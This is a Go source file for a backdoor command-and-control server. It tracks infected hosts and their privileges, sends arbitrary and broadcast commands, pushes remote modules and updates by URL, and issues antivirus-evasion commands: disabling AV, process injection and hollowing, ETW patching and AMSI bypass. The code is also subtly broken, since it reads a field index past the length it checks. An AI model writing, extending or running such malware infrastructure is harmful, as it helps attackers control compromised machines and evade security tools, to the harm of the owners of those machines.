package main

import (
	"bufio"
	"crypto/sha256"
	"crypto/tls"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"io"
	"net"
	"os"
	"strings"
	"sync"
	"time"
)

const (
	ServerPort = "443"           // Server port
	SecretKey  = "magic_key_123" // Secret key for authentication
	Timeout    = 30 * time.Second
	CertFile   = "server.crt"    // Certificate file
	KeyFile    = "server.key"    // Private key file
	CMD_DISABLE_AV     = "disable_av"
	CMD_BYPASS_AV      = "bypass_av"
	CMD_INJECT_PROCESS = "inject_process"
	CMD_HOLLOW_PROCESS = "hollow_process"
	CMD_PATCH_ETW      = "patch_etw"
	CMD_BYPASS_AMSI    = "bypass_amsi"
)

// Structure for storing backdoor information
type Backdoor struct {
	ID         string
	Conn       net.Conn
	Privileges string
	Version    string
	LastSeen   time.Time
	OS         string
	Arch       string
	IsAdmin    bool
	HasUAC     bool
	CanElevate bool
	AVStatus   string    // Статус антивируса
	Protection []string  // Активные защиты
}

var (
	activeBots = make(map[string]*Backdoor)
	mutex      = &sync.Mutex{}
	currentVersion = "1.0.0"
	binaryChecksum = "" // Will be set at startup
	updateURL = "https://example.com/backdoor/latest" // URL for updates
)

// Function for TLS setup
func setupTLS() (*tls.Config, error) {
	cert, err := tls.LoadX509KeyPair(CertFile, KeyFile)
	if err != nil {
		return nil, fmt.Errorf("error loading certificates: %v", err)
	}

	return &tls.Config{
		Certificates: []tls.Certificate{cert},
		MinVersion:  tls.VersionTLS12,
		CipherSuites: []uint16{
			tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
		},
	}, nil
}

// Function for connection validation
func validateConnection(conn net.Conn) bool {
	// Check IP address
	remoteIP := strings.Split(conn.RemoteAddr().String(), ":")[0]
	
	// Check for suspicious IPs
	suspiciousIPs := []string{
		"0.0.0.0", "127.0.0.1", "192.168.", "10.", "172.16.",
	}
	
	for _, ip := range suspiciousIPs {
		if strings.HasPrefix(remoteIP, ip) {
			return false
		}
	}
	
	return true
}

// Function for data obfuscation
func obfuscate(data string) string {
	return base64.StdEncoding.EncodeToString([]byte(data))
}

// Function for data deobfuscation
func deobfuscate(data string) string {
	decoded, err := base64.StdEncoding.DecodeString(data)
	if err != nil {
		return ""
	}
	return string(decoded)
}

// Function for calculating file checksum
func calculateChecksum(filePath string) (string, error) {
	file, err := os.Open(filePath)
	if err != nil {
		return "", err
	}
	defer file.Close()

	hash := sha256.New()
	if _, err := io.Copy(hash, file); err != nil {
		return "", err
	}

	return hex.EncodeToString(hash.Sum(nil)), nil
}

// Function for handling backdoor connections
func handleConnection(conn net.Conn) {
	defer conn.Close()

	// Set timeout
	conn.SetDeadline(time.Now().Add(Timeout))

	// Authentication
	reader := bufio.NewReader(conn)
	key, err := reader.ReadString('\n')
	if err != nil {
		fmt.Printf("Authentication error: %v\n", err)
		return
	}

	if deobfuscate(strings.TrimSpace(key)) != SecretKey {
		fmt.Println("Invalid authentication key")
		return
	}

	// Get system information
	sysInfo, err := reader.ReadString('\n')
	if err != nil {
		return
	}
	sysInfo = strings.TrimSpace(deobfuscate(sysInfo))
	parts := strings.Split(sysInfo, "|")
	if len(parts) != 7 {
		return
	}

	// Create backdoor structure
	backdoor := &Backdoor{
		ID:         conn.RemoteAddr().String(),
		Conn:       conn,
		Privileges: parts[0],
		OS:         parts[1],
		Arch:       parts[2],
		IsAdmin:    parts[3] == "true",
		HasUAC:     parts[6] == "true",
		CanElevate: parts[5] == "true",
		Version:    currentVersion,
		LastSeen:   time.Now(),
		AVStatus:   parts[4],
		Protection: strings.Split(parts[7], ","),
	}

	// Register backdoor
	mutex.Lock()
	activeBots[backdoor.ID] = backdoor
	mutex.Unlock()

	fmt.Printf("[+] New backdoor connected: %s (OS: %s/%s, Privileges: %s, UAC: %v)\n",
		backdoor.ID, backdoor.OS, backdoor.Arch, backdoor.Privileges, backdoor.HasUAC)

	// Command handling
	for {
		command, err := reader.ReadString('\n')
		if err != nil {
			break
		}

		command = strings.TrimSpace(deobfuscate(command))
		
		// Handle special commands
		switch {
		case strings.HasPrefix(command, "check_update:"):
			handleUpdateCheck(backdoor, command)
			
		case command == "get_checksum":
			handleChecksumRequest(backdoor)
			
		case command == "get_binary":
			handleBinaryRequest(backdoor)
			
		case command == "heartbeat":
			handleHeartbeat(backdoor)
			
		default:
			handleCommand(backdoor, command)
		}

		// Update last seen time
		backdoor.LastSeen = time.Now()
	}

	// Remove backdoor from active list
	mutex.Lock()
	delete(activeBots, backdoor.ID)
	mutex.Unlock()
	fmt.Printf("[-] Backdoor disconnected: %s\n", backdoor.ID)
}

// Command handlers
func handleUpdateCheck(b *Backdoor, command string) {
	version := strings.TrimPrefix(command, "check_update:")
	if version < currentVersion {
		b.Conn.Write([]byte(obfuscate(fmt.Sprintf("%s:%s:%s\n",
			currentVersion, binaryChecksum, updateURL))))
	} else {
		b.Conn.Write([]byte(obfuscate("no_update\n")))
	}
}

func handleChecksumRequest(b *Backdoor) {
	b.Conn.Write([]byte(obfuscate(binaryChecksum + "\n")))
}

func handleBinaryRequest(b *Backdoor) {
	b.Conn.Write([]byte(obfuscate(updateURL + "\n")))
}

func handleHeartbeat(b *Backdoor) {
	b.LastSeen = time.Now()
	b.Conn.Write([]byte(obfuscate("ok\n")))
}

func handleCommand(b *Backdoor, command string) {
	// Log command
	fmt.Printf("[%s] Executing command: %s\n", b.ID, command)
	
	// Send command
	b.Conn.Write([]byte(obfuscate(command + "\n")))
	
	// Get result
	reader := bufio.NewReader(b.Conn)
	result, err := reader.ReadString('\n')
	if err != nil {
		fmt.Printf("[Error getting result from %s]: %v\n", b.ID, err)
		return
	}
	
	fmt.Printf("[Result from %s]:\n%s\n", b.ID, deobfuscate(strings.TrimSpace(result)))
}

// Function for monitoring active backdoors
func monitorBackdoors() {
	for {
		time.Sleep(60 * time.Second)
		now := time.Now()
		
		mutex.Lock()
		for id, backdoor := range activeBots {
			if now.Sub(backdoor.LastSeen) > 5*time.Minute {
				fmt.Printf("[!] Backdoor %s not responding, removing\n", id)
				backdoor.Conn.Close()
				delete(activeBots, id)
			}
		}
		mutex.Unlock()
	}
}

// Function for displaying menu
func showMenu() {
	fmt.Println("\nBackdoor Management Menu:")
	fmt.Println("1. List active backdoors")
	fmt.Println("2. Send command to backdoor")
	fmt.Println("3. Load module to backdoor")
	fmt.Println("4. Update backdoors")
	fmt.Println("5. Remove backdoor")
	fmt.Println("6. Backdoor information")
	fmt.Println("7. Broadcast command")
	fmt.Println("8. Antivirus management")
	fmt.Println("9. Exit")
}

// Function for displaying backdoor information
func showBackdoorInfo(id string) {
	mutex.Lock()
	defer mutex.Unlock()

	if backdoor, ok := activeBots[id]; ok {
		fmt.Printf("\nBackdoor information %s:\n", id)
		fmt.Printf("Operating System: %s\n", backdoor.OS)
		fmt.Printf("Privileges: %s\n", backdoor.Privileges)
		fmt.Printf("Version: %s\n", backdoor.Version)
		fmt.Printf("Last seen: %s\n", backdoor.LastSeen.Format("2006-01-02 15:04:05"))
	} else {
		fmt.Println("Backdoor not found!")
	}
}

// Function for broadcasting commands
func broadcastCommand(command string) {
	mutex.Lock()
	defer mutex.Unlock()

	for id, backdoor := range activeBots {
		fmt.Printf("Sending command to backdoor %s...\n", id)
		backdoor.Conn.SetDeadline(time.Now().Add(Timeout))
		backdoor.Conn.Write([]byte(obfuscate(command + "\n")))
	}
}

// Function for antivirus management
func handleAVManagement(backdoor *Backdoor) {
	fmt.Println("\nAntivirus Management:")
	fmt.Println("1. Disable antivirus")
	fmt.Println("2. Advanced bypass")
	fmt.Println("3. Process injection")
	fmt.Println("4. Process hollowing")
	fmt.Println("5. Patch ETW")
	fmt.Println("6. Bypass AMSI")
	fmt.Println("7. Back")

	var choice int
	fmt.Print("Select action: ")
	fmt.Scan(&choice)

	switch choice {
	case 1:
		handleCommand(backdoor, CMD_DISABLE_AV)
	case 2:
		handleCommand(backdoor, CMD_BYPASS_AV)
	case 3:
		handleCommand(backdoor, CMD_INJECT_PROCESS)
	case 4:
		handleCommand(backdoor, CMD_HOLLOW_PROCESS)
	case 5:
		handleCommand(backdoor, CMD_PATCH_ETW)
	case 6:
		handleCommand(backdoor, CMD_BYPASS_AMSI)
	}
}

// Main server function
func main() {
	// Setup TLS
	tlsConfig, err := setupTLS()
	if err != nil {
		fmt.Println("Error setting up TLS:", err)
		return
	}

	// Start server with TLS
	listener, err := tls.Listen("tcp", ":"+ServerPort, tlsConfig)
	if err != nil {
		fmt.Println("Error starting server:", err)
		return
	}
	defer listener.Close()
	
	fmt.Println("Server started on port", ServerPort, "with TLS")

	// Start backdoor monitoring
	go monitorBackdoors()

	// Handle connections
	go func() {
		for {
			conn, err := listener.Accept()
			if err != nil {
				fmt.Println("Connection error:", err)
				continue
			}

			// Validate connection
			if !validateConnection(conn) {
				fmt.Printf("Suspicious connection from %s\n", conn.RemoteAddr())
				conn.Close()
				continue
			}

			go handleConnection(conn)
		}
	}()

	// Main menu
	for {
		showMenu()
		var choice int
		fmt.Print("Select action: ")
		fmt.Scan(&choice)

		switch choice {
		case 1:
			// List active backdoors
			fmt.Println("\nActive backdoors:")
			mutex.Lock()
			for id, backdoor := range activeBots {
				fmt.Printf("[%s] OS: %s/%s, Privileges: %s, Version: %s\n",
					id, backdoor.OS, backdoor.Arch, backdoor.Privileges, backdoor.Version)
			}
			mutex.Unlock()

		case 2:
			// Send command to backdoor
			fmt.Print("Enter backdoor ID: ")
			scanner := bufio.NewScanner(os.Stdin)
			scanner.Scan()
			botID := strings.TrimSpace(scanner.Text())
			
			fmt.Print("Enter command: ")
			scanner.Scan()
			command := strings.TrimSpace(scanner.Text())
			
			mutex.Lock()
			if backdoor, ok := activeBots[botID]; ok {
				handleCommand(backdoor, command)
			} else {
				fmt.Println("Backdoor not found!")
			}
			mutex.Unlock()

		case 3:
			// Load module to backdoor
			fmt.Print("Enter backdoor ID: ")
			scanner := bufio.NewScanner(os.Stdin)
			scanner.Scan()
			botID := strings.TrimSpace(scanner.Text())
			
			fmt.Print("Enter module URL: ")
			scanner.Scan()
			moduleURL := strings.TrimSpace(scanner.Text())
			
			mutex.Lock()
			if backdoor, ok := activeBots[botID]; ok {
				handleCommand(backdoor, "load_module:"+moduleURL)
			} else {
				fmt.Println("Backdoor not found!")
			}
			mutex.Unlock()

		case 4:
			// Update backdoors
			fmt.Print("Enter new version: ")
			scanner := bufio.NewScanner(os.Stdin)
			scanner.Scan()
			newVersion := strings.TrimSpace(scanner.Text())
			
			currentVersion = newVersion
			fmt.Println("Version updated. Backdoors will update on next check.")

		case 5:
			// Remove backdoor
			fmt.Print("Enter backdoor ID: ")
			scanner := bufio.NewScanner(os.Stdin)
			scanner.Scan()
			botID := strings.TrimSpace(scanner.Text())
			
			mutex.Lock()
			if backdoor, ok := activeBots[botID]; ok {
				handleCommand(backdoor, "self_destruct")
				delete(activeBots, botID)
			} else {
				fmt.Println("Backdoor not found!")
			}
			mutex.Unlock()

		case 6:
			// Backdoor information
			fmt.Print("Enter backdoor ID: ")
			scanner := bufio.NewScanner(os.Stdin)
			scanner.Scan()
			botID := strings.TrimSpace(scanner.Text())
			showBackdoorInfo(botID)

		case 7:
			// Broadcast command
			fmt.Print("Enter command for all backdoors: ")
			scanner := bufio.NewScanner(os.Stdin)
			scanner.Scan()
			command := strings.TrimSpace(scanner.Text())
			broadcastCommand(command)

		case 8:
			// Antivirus management
			fmt.Print("Enter backdoor ID: ")
			scanner := bufio.NewScanner(os.Stdin)
			scanner.Scan()
			botID := strings.TrimSpace(scanner.Text())
			
			mutex.Lock()
			if backdoor, ok := activeBots[botID]; ok {
				handleAVManagement(backdoor)
			} else {
				fmt.Println("Backdoor not found!")
			}
			mutex.Unlock()

		case 9:
			// Exit
			fmt.Println("Exiting...")
			return

		default:
			fmt.Println("Invalid choice!")
		}
	}
}